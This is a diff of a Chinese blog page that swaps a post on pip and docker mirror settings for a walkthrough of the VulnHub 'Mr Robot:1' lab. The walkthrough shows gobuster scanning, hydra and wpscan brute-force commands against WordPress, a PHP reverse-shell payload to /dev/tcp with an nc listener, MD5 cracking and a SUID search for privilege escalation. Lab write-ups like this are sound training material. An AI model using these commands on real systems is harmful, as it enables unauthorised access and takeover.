@@ -4,7 +4,7 @@
   <!-- 元数据 -->
   <meta charset="utf-8">
   <link rel="icon" href="/images/a.jpg">
-  <title>pip源&docker源 | Facker007's blog</title>
+  <title>vulnhub Mr Robot:1 | Facker007's blog</title>
   <meta name="author" content="Facker007" />
   <meta http-equiv="Cache-Control" content="no-transform" />
   <meta http-equiv="Cache-Control" content="no-siteapp" />
@@ -13,20 +13,20 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <meta name="format-detection" content="telphone=no, email=no" />
   
-    <meta name="keywords" content="pip源&docker源" />
+    <meta name="keywords" content="vulnhub" />
   
-  <meta name="description" content="windows下永久配置pip源进入C:\Users\Administrator新建pip文件夹，新建pip.ini文件pip.ini文件内容 1234[global]index-url&#x3D;http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;[install]trusted-host&#x3D;mirrors.ali">
+  <meta name="description" content="开局一手netdiscover和nmap gobuster扫出来的robots和wp 1gobuster dir -u http:&#x2F;&#x2F;192.168.0.100 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt  还拿到了第一个key fsocity&#x3D;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pip源&amp;docker源">
-<meta property="og:url" content="http://example.com/2021/02/15/pip%E6%BA%90-docker%E6%BA%90/index.html">
+<meta property="og:title" content="vulnhub Mr Robot:1">
+<meta property="og:url" content="http://example.com/2021/08/23/vulnhub-Mr-Robot-1/index.html">
 <meta property="og:site_name" content="Facker007&#39;s blog">
-<meta property="og:description" content="windows下永久配置pip源进入C:\Users\Administrator新建pip文件夹，新建pip.ini文件pip.ini文件内容 1234[global]index-url&#x3D;http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;[install]trusted-host&#x3D;mirrors.ali">
+<meta property="og:description" content="开局一手netdiscover和nmap gobuster扫出来的robots和wp 1gobuster dir -u http:&#x2F;&#x2F;192.168.0.100 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt  还拿到了第一个key fsocity&#x3D;">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/a.jpg">
-<meta property="article:published_time" content="2021-02-15T02:12:00.000Z">
-<meta property="article:modified_time" content="2021-05-07T11:16:15.863Z">
+<meta property="article:published_time" content="2021-08-23T14:13:00.000Z">
+<meta property="article:modified_time" content="2021-08-24T13:33:40.081Z">
 <meta property="article:author" content="Facker007">
-<meta property="article:tag" content="pip源&amp;docker源">
+<meta property="article:tag" content="vulnhub">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/a.jpg">
 <meta name="twitter:site" content="@null">
@@ -114,17 +114,17 @@
     <article>
         <div class="kratos-hentry kratos-post-inner clearfix">
             <header class="kratos-entry-header">
-                <h1 class="kratos-entry-title text-center">pip源&docker源</h1>
+                <h1 class="kratos-entry-title text-center">vulnhub Mr Robot:1</h1>
                 
                 <div class="kratos-post-meta text-center">
                     <span>
-                        <i class="fa fa-calendar"></i> 2021-02-15
+                        <i class="fa fa-calendar"></i> 2021-08-23
                         <i class="fa fa-folder"></i> 分类 
                         <i class="fa fa-user"></i> 作者 Facker007
                         <i class="fa fa-edit"></i> 
                         
                         
-                            720
+                            1256
                         
                         字
                         
@@ -133,26 +133,37 @@
             </header>
             <div class="kratos-post-content">
                 <div id="expire-alert" class="alert alert-warning hidden" role="alert">
-                    本文最后编辑于 <time datetime="1620386175863"></time> 前，其中的内容可能需要更新。
+                    本文最后编辑于 <time datetime="1629812020081"></time> 前，其中的内容可能需要更新。
                 </div>
                 
                 <hr />
-                <p><strong>windows下永久配置pip源</strong><br>进入C:\Users\Administrator新建pip文件夹，新建pip.ini文件<br>pip.ini文件内容</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url&#x3D;http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br><span class="line">[install]</span><br><span class="line">trusted-host&#x3D;mirrors.aliyun.com</span><br></pre></td></tr></table></figure>
-<p><img src="a.png" alt="pip.ini" title="pip.ini"></p>
-<p>列出配置文件查看是否生效<br><img src="20210215101916.png" alt="config list" title="config list"></p>
-<hr>
-<p><strong>linux下永久配置pip源</strong><br>cd ~进入用户家目录，mkdir -p .pip创建.php文件夹,vim pip.conf<br>pip.conf文件内容</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url&#x3D;http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br><span class="line"></span><br><span class="line">[install]</span><br><span class="line">trusted-host&#x3D;mirrors.aliyun.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="20210215103256.png" alt="pip.conf" title="pip.conf"></p>
-<hr>
-<p><strong>windows，linux下pip临时更改源</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install xxx -i http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple</span><br></pre></td></tr></table></figure>
-<hr>
-<p><strong>linux下配置docker源</strong>  </p>
-<p>拉取镜像的时候很慢，就配了个国内的docker镜像加速,vim /etc/docker/daemon.json</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https:&#x2F;&#x2F;docker.mirrors.ustc.edu.cn&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="20210215113454.png" alt="daemon.json" title="daemon.json"></p>
+                <p>开局一手netdiscover和nmap<br><img src="1.png" alt="1.png"></p>
+<p>gobuster扫出来的robots和wp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.0.100 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>
+<p><img src="2.png" alt="2.png"></p>
+<p>还拿到了第一个key<br><img src="one-key.png" alt="one-key.png"></p>
+<p>fsocity=社会<br>dir=directory=字典<br>社会工程学字典。感觉是爆破用的<br><img src="3.png" alt="3.png"></p>
+<p>sort搭配uniq给字典排序and去重<br><img src="4.png" alt="4.png"></p>
+<p>hydra扫描用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -t 64 -L fsocity-sort.dic -p test 192.168.0.101 http-form-post &quot;&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log In:Invalid username&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="5.png" alt="5.png"></p>
+<p>wpscan爆破密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.0.101&#x2F; --api-token xxxx --usernames Elliot --passwords fsocity-sort.dic</span><br></pre></td></tr></table></figure>
+<p><img src="6.png" alt="6.png"></p>
+<p>反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exec(&quot;&#x2F;bin&#x2F;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.105&#x2F;1234 0&gt;&amp;1&#39;&quot;);?&gt;             &#x2F;&#x2F;写弹shell语句</span><br><span class="line">nc -lnvp 1234               &#x2F;&#x2F;接受反弹shell</span><br></pre></td></tr></table></figure>
+<p><img src="7.png" alt="7.png"></p>
+<p>拿到第二个key<br><img src="two-key.png" alt="two-key.png"></p>
+<p>md5破解密码and login<a target="_blank" rel="noopener" href="https://crackstation.net/">MD5破解</a><br><img src="8.png" alt="8.png"></p>
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/nmap/">nmap提权</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+<p><img src="9.png" alt="9.png"></p>
+<p>第三个key<br><img src="three-key.png" alt="three-key.png"></p>
+<p>其他参考：<br><a target="_blank" rel="noopener" href="https://nwrzd.medium.com/vulnhub-com-mr-robot-1-walkthrough-5119586b2a3f">1.</a><br><a target="_blank" rel="noopener" href="https://nwrzd.medium.com/vulnhub-com-mr-robot-1-walkthrough-5119586b2a3f">https://nwrzd.medium.com/vulnhub-com-mr-robot-1-walkthrough-5119586b2a3f</a></p>
+<p><a target="_blank" rel="noopener" href="https://medium.com/@D00MFist/vulnhub-mr-robot-220348146b3b">2.</a><br><a target="_blank" rel="noopener" href="https://medium.com/@D00MFist/vulnhub-mr-robot-220348146b3b">https://medium.com/@D00MFist/vulnhub-mr-robot-220348146b3b</a></p>
+<p><a target="_blank" rel="noopener" href="https://hive.blog/security/@falconspy/mr-robot-vulnhub-walkthrough">3.</a><br><a target="_blank" rel="noopener" href="https://hive.blog/security/@falconspy/mr-robot-vulnhub-walkthrough">https://hive.blog/security/@falconspy/mr-robot-vulnhub-walkthrough</a></p>
+<p><a target="_blank" rel="noopener" href="https://alpinesecurity.com/blog/mr-robot-walkthrough-vulnhub/">4.</a><br><a target="_blank" rel="noopener" href="https://alpinesecurity.com/blog/mr-robot-walkthrough-vulnhub/">https://alpinesecurity.com/blog/mr-robot-walkthrough-vulnhub/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.infosecarticles.com/mr-robot-ctf-1-walkthrough/">5.</a><br><a target="_blank" rel="noopener" href="https://www.infosecarticles.com/mr-robot-ctf-1-walkthrough/">https://www.infosecarticles.com/mr-robot-ctf-1-walkthrough/</a></p>
 
             </div>
             
@@ -206,7 +217,7 @@
     <script type="text/javascript">
         $(()=>{
             new QRCode("wechat-qr", {
-                text: "http://example.com/2021/02/15/pip%E6%BA%90-docker%E6%BA%90/",
+                text: "http://example.com/2021/08/23/vulnhub-Mr-Robot-1/",
                 width: 150,
                 height: 150,
                 correctLevel : QRCode.CorrectLevel.H
@@ -218,10 +229,11 @@
             const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
             const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
             const twitterBase   = "https://twitter.com/intent/tweet?";
-            const hostUrl       = "http://example.com/2021/02/15/pip%E6%BA%90-docker%E6%BA%90/";
-            const title         = "「pip源&docker源」";
-            const excerpt       = `windows下永久配置pip源进入C:\Users\Administrator新建pip文件夹，新建pip.ini文件pip.ini文件内容
-1234[global]index-url&#x3D;http:&#x2F;&#x2F;m...`;
+            const hostUrl       = "http://example.com/2021/08/23/vulnhub-Mr-Robot-1/";
+            const title         = "「vulnhub Mr Robot:1」";
+            const excerpt       = `开局一手netdiscover和nmap
+gobuster扫出来的robots和wp
+1gobuster dir -u http:&#x2F;&#x2F;192.168.0.100 -w &#x2F;usr&#x2F;share&#x...`;
             let _URL;
             switch (dest) {
                 case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
@@ -240,10 +252,10 @@
                 <div class="footer-tag clearfix">
                     <div class="pull-left">
                     <i class="fa fa-tags"></i>
-                        <a class="tag-none-link" href="/tags/pip%E6%BA%90-docker%E6%BA%90/" rel="tag">pip源&docker源</a>
+                        <a class="tag-none-link" href="/tags/vulnhub/" rel="tag">vulnhub</a>
                     </div>
                     <div class="pull-date">
-                    <span>最后编辑：2021-05-07</span>
+                    <span>最后编辑：2021-08-24</span>
                     </div>
                 </div>
             </footer>
@@ -252,13 +264,9 @@
             <nav class="navigation post-navigation clearfix" role="navigation">
                 
                 <div class="nav-previous clearfix">
-                    <a title=" 关于我" href="/2021/02/11/hello-world/">&lt; 上一篇</a>
+                    <a title=" vulnhub Momentum:1" href="/2021/08/22/vulnhub-Momentum-1/">&lt; 上一篇</a>
                 </div>
                 
-                
-                <div class="nav-next clearfix">
-                    <a title=" buuctf-misc系列1" href="/2021/02/15/buuctf-misc系列1/">下一篇 &gt;</a>
-                </div>
                 
             </nav>
         
